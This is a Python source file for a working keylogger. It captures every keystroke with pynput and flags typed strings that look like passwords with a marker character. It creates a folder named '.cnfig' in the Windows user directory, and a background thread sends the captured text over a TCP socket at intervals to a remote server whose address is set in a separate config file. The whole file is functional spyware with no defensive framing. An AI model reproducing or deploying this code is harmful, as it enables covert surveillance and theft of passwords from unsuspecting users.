import threading 
from functools import partial
from pynput import keyboard
from key import SERVER_IP_ADDR, SERVER_PORT, TIME_INTERVAL #local file that stores variables -- can be locally defined as well
import os
import re
import socket
import time
from queue import Queue
from io import StringIO

class KeyLogger:
    def __init__(self, server_host, server_port, interval):
        self.server_host = server_host
        self.server_port = server_port
        self.interval = interval
        self.buffer = StringIO()
        self.buffer_lock = threading.Lock()
        self.word = ""
        self.queue = Queue(maxsize=1000)  # Buffer for keyboard events
        self.setup_files()
        
    def setup_files(self):
        """Initialize directory and file structure."""
        self.dirname = ".cnfig"
        self.filename = os.getlogin() + ".txt"
        path = os.path.join("C:\\Users", os.getlogin())
        
        if not os.path.exists(path):
            raise Exception("Path does not exist")
            
        self.dir_path = os.path.join(path, self.dirname)
        os.makedirs(self.dir_path, exist_ok=True)
        
        self.file_path = os.path.join(self.dir_path, self.filename)
        if not os.path.exists(self.file_path):
            open(self.file_path, 'a').close()

    def check_pass(self, password: str) -> bool:
        """Check if string matches password pattern."""
        pattern = r"^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}$"
        return bool(re.match(pattern, password))

    def process_key(self, key):
        """Process a key event and add it to the queue."""
        try:
            if hasattr(key, 'char'):
                return ('char', key.char)
            elif key == keyboard.Key.space:
                return ('space', None)
            elif key == keyboard.Key.enter:
                return ('enter', None)
            elif key == keyboard.Key.backspace:
                return ('backspace', None)
            elif key == keyboard.Key.delete:
                return ('delete', None)
            elif key in (keyboard.Key.alt, keyboard.Key.tab, 
                        keyboard.Key.shift, keyboard.Key.ctrl, keyboard.Key.cmd):
                return ('special', key.name.upper())
            else:
                return ('other', str(key))
        except Exception:
            return None

    def key_handler(self, key):
        """Handle keyboard events by queueing them."""
        processed = self.process_key(key)
        if processed:
            try:
                self.queue.put_nowait(processed)
            except Queue.Full:
                pass  # Drop events if queue is full

    def process_queue(self):
        """Process queued keyboard events and write to buffer."""
        while True:
            try:
                while not self.queue.empty():
                    key_type, value = self.queue.get_nowait()
                    
                    with self.buffer_lock:
                        if key_type == 'char':
                            self.word += value
                        elif key_type == 'space':
                            self.buffer.write(self.word + " \n")
                            self.word = ""
                        elif key_type == 'enter':
                            if self.check_pass(self.word):
                                self.word = "\u00BF" + self.word
                            self.buffer.write(self.word + "\n")
                            self.word = ""
                        elif key_type == 'backspace':
                            self.word = self.word[:-1]
                        elif key_type == 'special':
                            self.buffer.write(f"[{value}]\n")
                        elif key_type == 'other':
                            self.buffer.write(f"[{value}]\n")
                
            except Exception as e:
                print(f"Error processing queue: {e}")
            
            time.sleep(0.1)  # Reduce CPU usage

    def send_buffer(self):
        """Send buffer contents to server periodically."""
        while True:
            try:
                with self.buffer_lock:
                    content = self.buffer.getvalue()
                    if content:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                            client_socket.connect((self.server_host, self.server_port))
                            client_socket.sendall(content.encode('utf-8'))
                            client_socket.sendall(b"END")
                            
                            response = client_socket.recv(1024).decode('utf-8')
                            if response:  # Only clear if server acknowledged
                                self.buffer = StringIO()  # Create new buffer
                
            except Exception as e:
                print(f"Send error: {e}")
            
            time.sleep(self.interval)

    def run(self):
        """Start the keylogger and associated threads."""
        print(f"Keylogger running with PID: {os.getpid()}")
        
        # Start keyboard listener
        listener = keyboard.Listener(on_press=self.key_handler)
        listener.start()
        
        # Start queue processor
        processor = threading.Thread(target=self.process_queue, daemon=True)
        processor.start()
        
        # Start sender
        sender = threading.Thread(target=self.send_buffer, daemon=True)
        sender.start()
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            listener.stop()

def run():
    """Initialize and run the keylogger."""
    try:
        logger = KeyLogger(SERVER_IP_ADDR, SERVER_PORT, TIME_INTERVAL)
        logger.run()
    except Exception as e:
        print(f"Failed to start keylogger: {e}")

if __name__ == "__main__":
    run()